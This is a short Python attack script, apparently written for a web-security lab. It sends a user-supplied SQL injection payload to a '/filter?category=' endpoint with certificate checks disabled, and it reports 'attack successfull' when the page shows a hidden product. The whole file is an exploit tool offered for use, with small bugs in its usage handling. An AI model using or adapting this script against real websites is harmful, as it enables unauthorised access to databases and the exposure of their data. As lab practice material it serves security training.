# imports
import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="The url to supply")
parser.add_argument('-p', '--payload', required=True, help="the SQl inject payload , make sure to wrap the qoute escape the payload")
args =  parser.parse_args() 

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False)
    if "Food Hider" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = args.url
        payload = args.payload
    except IndexError:
        print("Usage, %s ./script -u url -p payload")
    if exploit_sqli(url, payload):
        print("(+) attack successfull")
    else:
        print("(-) Attack Failed")
